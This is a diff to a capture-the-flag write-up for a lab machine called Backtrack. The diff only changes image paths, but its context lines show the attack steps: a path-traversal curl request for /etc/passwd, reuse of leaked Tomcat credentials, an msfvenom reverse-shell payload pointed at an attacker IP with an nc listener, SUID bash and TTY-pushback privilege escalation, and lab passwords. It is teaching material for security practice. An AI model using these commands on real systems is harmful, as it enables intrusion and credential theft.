@@ -68,7 +68,7 @@ nmap -sC -sV -p- -T5 -v -oN /home/kali/Desktop/THM_LAB/rooms/backtrack/scan.txt 
 - Port 8080 = Java web/application server (Tomcat).
 - Port 8888 = Something is listening on 8888, and my probe resembles sun-answerbook, but Nmap is not confident.
 
-![Nmap](/assets/images/writeups/backtrack/backtrack_1.png)
+![Nmap](/assets/images/writeups/thm/backtrack/backtrack_1.png)
 
 ➡️ **Decision:** Focus on the web server first.
 
@@ -79,7 +79,7 @@ nmap -sC -sV -p- -T5 -v -oN /home/kali/Desktop/THM_LAB/rooms/backtrack/scan.txt 
 ### ❓ File Disclosure?
 Commonly called as Local File Inclusion (LFI) or path traversal, depending on how and where application accidentally allows someone to access or read files that they should not be able to access.
 
-![gobuster](/assets/images/writeups/backtrack/backtrack_2.png)
+![gobuster](/assets/images/writeups/thm/backtrack/backtrack_2.png)
 
 ### 🔎 Key Finding
 In the settings, i found the server info. This is version 1.35.0.
@@ -93,9 +93,9 @@ Testing the payload from the PoC, it allows me to read files from the server
 ```bash
  curl --path-as-is 'http://10.10.61.142:8888/../../../../../../../../../../../../../../../../../../../../etc/passwd'
 ```
-![Command](/assets/images/writeups/backtrack/backtrack_3.png)
+![Command](/assets/images/writeups/thm/backtrack/backtrack_3.png)
 
-![Command](/assets/images/writeups/backtrack/backtrack_3.1.png)
+![Command](/assets/images/writeups/thm/backtrack/backtrack_3.1.png)
 
 ### 🔎 Key Finding
 
@@ -108,16 +108,16 @@ username="tomcat" password="OPx5 <REDACTED> Zpx4fr"
 
 ➡️ Use the credentials on (host-manager or manager-app or service-status ):
 
-![credentials](/assets/images/writeups/backtrack/backtrack_4.png)
+![credentials](/assets/images/writeups/thm/backtrack/backtrack_4.png)
 
 ```
 http://<target-ip>:8080/manager
 ```
 I got 403 access denied And get disappointed. i had no permissions. This is because i was not allowed to manage via GUI in the role of manager-script. No problem, then i simply use cURL.
 
-![credentials](/assets/images/writeups/backtrack/backtrack_5.png)
+![credentials](/assets/images/writeups/thm/backtrack/backtrack_5.png)
 
-![credentials](/assets/images/writeups/backtrack/backtrack_6.png)
+![credentials](/assets/images/writeups/thm/backtrack/backtrack_6.png)
 
 ### ❓ Why MsfVenom?
 
@@ -128,7 +128,7 @@ it's a tool that can generate various payloads, including files/scripts suitable
 ```
 msfvenom -p java/shell_reverse_tcp lhost=<attacker-ip> lport=9999 -f war -o pwn.war
 ```
-![MsfVenom](/assets/images/writeups/backtrack/backtrack_7.png)
+![MsfVenom](/assets/images/writeups/thm/backtrack/backtrack_7.png)
 
 set up a listener on my (Attacker Machine).
 
@@ -199,7 +199,7 @@ on the `/tmp` folder i got the bash running as `wilbur`.
 ls -la 
 /tmp/bash -p
 ```
-![Exploit](/assets/images/writeups/backtrack/backtrack_8.png)
+![Exploit](/assets/images/writeups/thm/backtrack/backtrack_8.png)
 
 
 executing this there is a bash shell and i found a hidden `.just_in_case.txt` file that contains wilbur’s password which will allow us to get a more stable shell through ssh.
@@ -210,7 +210,7 @@ wilbur : mYe317Tb9qTNrWFND7KF
 
 There was another file from `orville` telling that there is a `internal website running locally` and he has lefted credentials for it.
 
-![Credentials](/assets/images/writeups/backtrack/backtrack_9.png)
+![Credentials](/assets/images/writeups/thm/backtrack/backtrack_9.png)
 
 ### 🔐 Internal App Credentials Retrieved
 
@@ -240,7 +240,7 @@ ssh wilbur@<room-ip> -L 5000:127.0.0.1:80
 ```
 Looking at `http://localhost:5000/` i got the image gallery orville’s talking about and logging in with the credentials mentioned on the text file got me in to `http://localhost:5000/dashboard.php`
 
-![Internal Service](/assets/images/writeups/backtrack/backtrack_10.png)
+![Internal Service](/assets/images/writeups/thm/backtrack/backtrack_10.png)
 
 ### 📤🔓 Insecure File Upload
 
@@ -262,7 +262,7 @@ nc -lvnp 5555
 ```
 here i found flag and some clue.
 
-![Internal Service](/assets/images/writeups/backtrack/backtrack_11.png)
+![Internal Service](/assets/images/writeups/thm/backtrack/backtrack_11.png)
 
 ---
 
@@ -277,7 +277,7 @@ CTF machines often:
 
 In orville's home directory, i found the zip archive `web_snapshot.zip`. This also contains my uploaded files, it is probably created regularly, but i couldnot find anything in the cronjobs. i bring `psyp64` to the machine (using a web server or scp).
 
-![Cron Job](/assets/images/writeups/backtrack/backtrack_12.png)
+![Cron Job](/assets/images/writeups/thm/backtrack/backtrack_12.png)
 
 ### ❓ Why Pspy64?
 Pspy64 is a non-intrusive tool used to monitor active processes and system commands in real time without requiring root privileges.
@@ -286,7 +286,7 @@ After letting `Pspy64` running for a while i saw something very odd, so i saw an
 
 Seeing the `su - orville` reminded me of an old and forgotton priv esc technique, the `TTY Pushback` vulnerability. So basically this vulnerability allows any low privileged attacker to inject commands into an admin’s terminal using TTY pushback, making the system execute those commands as if the admin typed them, potentially escalating privileges. Read more about it in this [blog post](https://www.errno.fr/TTYPushback.html).
 
-![Cron Job](/assets/images/writeups/backtrack/backtrack_13.png)
+![Cron Job](/assets/images/writeups/thm/backtrack/backtrack_13.png)
 
 For that i needed to use the mentionned python script to make root set an `SUID` on the bash binary, make it so the script is executed once a session is opened through `.bashrc` and wait.
 
@@ -325,7 +325,7 @@ cd /dev/shm
 ls -la
 bash -p
 ```
-![Flag](/assets/images/writeups/backtrack/backtrack_14.png)
+![Flag](/assets/images/writeups/thm/backtrack/backtrack_14.png)
 
 ---
 
@@ -348,7 +348,7 @@ Each step built on the last, and it was a great exercise in real-world exploitat
  - nmap
  - burpsuit
  
-🖼️ **all process screenshot:** ![all process](/assets/images/writeups/backtrack/all_process.png)
+🖼️ **all process screenshot:** ![all process](/assets/images/writeups/thm/backtrack/all_process.png)
 
 
 
